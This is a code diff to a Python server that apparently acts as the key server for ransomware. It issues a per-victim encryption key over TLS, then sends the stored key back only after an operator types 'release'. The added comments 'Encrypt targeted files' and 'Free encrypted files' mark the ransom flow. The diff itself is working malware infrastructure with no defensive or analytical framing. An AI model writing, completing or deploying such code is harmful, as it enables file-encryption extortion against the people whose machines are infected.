@@ -1,6 +1,7 @@
 import os
 import socket
 import ssl
+import ssl
 
 HOST = '127.0.0.1'
 PORT = 8080
@@ -13,7 +14,7 @@ def generate_new_key(client_ip):
     return random_key
 
 def read_existing_key(client_ip):
-    with open(os.path.join('keys', client_ip), 'rb') as key_file:
+    with open(os.path.join('keys', f'{client_ip}.txt'), 'rb') as key_file:
         key = key_file.read()
         return key
 
@@ -41,8 +42,16 @@ if __name__ == '__main__':
     ssl_connection = context.wrap_socket(connection, server_side=True)
     ip, port = ssl_connection.getpeername()
 
+    # Encrypt targeted files
     random_key = generate_new_key(ip)
     ssl_connection.sendall(random_key)
+
+    # Free encrypted files
+    while input("Write 'release' to free the target from the encryption: ") != 'release':
+        pass
+
+    target_key = read_existing_key(ip)
+    ssl_connection.sendall(target_key)
 
     # Close all sockets
     ssl_connection.close()
